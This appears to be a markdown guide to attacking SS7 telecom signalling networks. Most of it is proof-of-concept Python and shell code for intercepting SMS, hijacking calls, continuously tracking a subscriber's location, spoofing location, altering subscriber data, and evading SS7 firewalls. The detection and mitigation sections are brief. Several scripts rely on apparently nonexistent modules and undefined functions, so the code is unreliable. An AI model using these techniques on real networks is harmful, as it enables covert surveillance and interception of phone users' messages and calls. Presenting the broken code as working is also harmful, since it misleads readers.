## 1. Introduction
The SS7 (Signaling System No. 7) protocol is a critical component of telecommunications networks, enabling various services such as SMS, call setup, and location tracking. Due to its design, SS7 is susceptible to various attacks that can compromise user privacy and network security. This suite provides a comprehensive framework for identifying, exploiting, and mitigating SS7 vulnerabilities.

---

## 2. Reconnaissance & Attack Surface Mapping

### 2.1 SS7 Protocol Analysis
- **Objective**: Analyze SS7 traffic to identify potential vulnerabilities.
- **Tools**: Wireshark with SS7 dissectors.
- **Capture Traffic**:
  ```bash
  tshark -i any -Y "sccp" -V
  ```

### 2.2 Network Component Discovery
- **SS7 Mapping Tool**: Use `ss7maper` to discover network components.
- **Command**:
  ```bash
  ./ss7maper -i <interface> -mcc <mcc> -mnc <mnc>
  ```
- **Output**: Identify Signal Transfer Points (STPs), Service Control Points (SCPs), and Home Location Registers (HLRs).

---

## 3. Attack Vector Analysis & Proof of Concepts (POCs)

### 3.1 SMS Interception
- **Mechanism**: Exploit the MAP ForwardSM to intercept SMS messages.

#### POC Script:
```python
from scapy.layers.ss7 import *
from scapy.all import send

target_msisdn = "<target_msisdn>"
attacker_gt = "<attacker_gt>"  # Spoofed Global Title

# Construct the ForwardSM message
fwd_sm = MAP_FwdSM(
    sMSCAddress=GlobalTitle(tt=1, np=1, nai=4, gti=0, digits=attacker_gt),
    serviceCentreAddress=ISDN_Address(nature=3, plan=1, digits="<smsc_number>"),
    msisdn=target_msisdn
)

# Send the crafted message
send(fwd_sm, iface="<interface>", verbose=1)
```

### 3.2 Call Hijacking
- **Mechanism**: Manipulate ISUP Initial Address Message (IAM) to hijack calls.

#### Capture Legitimate Call:
```bash
ss7trace -p <port> -f "IAM" -o call_capture.pcap
```

#### Inject Malicious IAM:
```python
from scapy.layers.ss7 import *

malicious_iam = ISUP_IAM(
    cic=<cic>,  # Stolen Circuit Identification Code
    calledPartyNumber="<attacker_number>",
    callingPartyNumber="<spoofed_caller>"
)

# Send the malicious IAM
send_ss7(malicious_iam, iface="<interface>")
```

### 3.3 Location Tracking
- **Exploit**: Abuse Any Time Interrogation (ATI) requests for tracking.

#### Tracking Script:
```python
import time
from scapy.layers.ss7 import *

def track_location(imsi, interval=60):
    while True:
        ati = MAP_AnyTimeInterrogation(imsi=imsi, requestedInfo=["location"])
        response = sr1(ati, iface="<interface>", timeout=5)
        if response:
            print(f"Location Update: {response[MAP_AnyTimeInterrogationRes].get_field('location')}")
        time.sleep(interval)

track_location("<target_imsi>")
```

### 3.4 Location Spoofing
- **Mechanism**: Manipulate the user's reported location using MAP Location Update.

#### POC Script:
```python
from scapy.layers.ss7 import *

def spoof_location(imsi, new_location):
    location_update = MAP_LocationUpdate(
        imsi=imsi,
        newLocation=new_location
    )
    send_ss7(location_update, iface="<interface>")

spoof_location("<target_imsi>", "<new_location>")
```

### 3.5 Subscriber Data Manipulation
- **Mechanism**: Exploit vulnerabilities to modify subscriber data in HLRs or SCPs.

#### POC Script:
```python
from scapy.layers.ss7 import *

def modify_subscriber_data(imsi, new_data):
    update_data = MAP_UpdateLocation(
        imsi=imsi,
        newData=new_data
    )
    send_ss7(update_data, iface="<interface>")

modify_subscriber_data("<target_imsi>", {"new_field": "new_value"})
```

---

## 4. Advanced Exploitation Techniques

### 4.1 Replay Attacks
- **Mechanism**: Capture and replay legitimate messages to exploit vulnerabilities.

#### POC Script:
```python
from scapy.all import *

def replay_message(captured_pcap):
    packets = rdpcap(captured_pcap)
    for packet in packets:
        send(packet, iface="<interface>", verbose=0)

replay_message("captured_traffic.pcap")
```

### 4.2 Man-in-the-Middle (MitM) Attacks
- **Mechanism**: Intercept and alter messages in transit.

#### POC Script:
```python
from scapy.all import *

def mitm_attack(target_ip):
    # Setup ARP spoofing or similar technique
    # Capture packets and modify as needed
    pass  # Implement your MitM logic here

mitm_attack("<target_ip>")
```

---

## 5. Exploitation Testing Framework

### 5.1 Virtual SS7 Core Setup
- **Setup**: Use Docker to run an SS7 core.
```bash
docker run -d --name osmocom-core -p <port>:<port> osmocom/osmo-msc
```

### 5.2 Firewall Bypass Testing
- **Test for firewall rule bypass via SCCP segmentation**:
```python
fragmented_msg = SCCP()/SCCP_CR()/SCCP_DT1(data=payload[:120])/SCCP_DT2(data=payload[120:])
send(fragmented_msg, iface="<interface>", loop=1, inter=0.1)
```

---

## 6. Detection and Monitoring

### 6.1 Intrusion Detection Systems (IDS)
- **Implementation**: Set up IDS to monitor SS7 traffic for anomalies.
- **Tools**: Snort, Suricata with custom rules for SS7 traffic.

#### Example Rule:
```plaintext
alert ss7 any -> any (msg:"SS7 Anomaly Detected"; sid:1000001;)
```

### 6.2 Traffic Analysis Tools
- **Tools**: Wireshark, ss7maper, ss7trace.
- **Usage**: Analyze traffic patterns and identify potential attacks.

---

## 7. Post-Exploitation Analysis

### 7.1 Data Exfiltration Analysis
- **SMS Capture Verification**:
```bash
tshark -r sms_capture.pcap -Y "gsmtap" -T fields -e gsma.tp-oa -e gsma.tp-da
```

### 7.2 Call Record Correlation
```python
from ss7_analyzer import CDRProcessor

cdr = CDRProcessor("call_detail_records.csv")
matched_calls = cdr.find_matching_pairs(original_caller="<original_caller>", hijacked_caller="<hijacked_caller>")
print(f"Successful hijackings: {len(matched_calls)}")
```

---

## 8. Mitigation Validation

### 8.1 Firewall Rule Testing
```python
from ss7_firewall import SS7Firewall

fw = SS7Firewall(rules_file="sms_filtering_rules.json")
test_packet = create_malicious_forwardSM()
result = fw.inspect(test_packet)
print(f"Packet blocked: {result['action'] == 'DROP'}")
```

### 8.2 Security Controls and Best Practices
- **Network Segmentation**: Isolate SS7 networks from other parts of the infrastructure.
- **Access Controls**: Implement strict access controls on SS7 components.
- **Regular Security Audits**: Conduct regular security assessments and audits of SS7 systems.
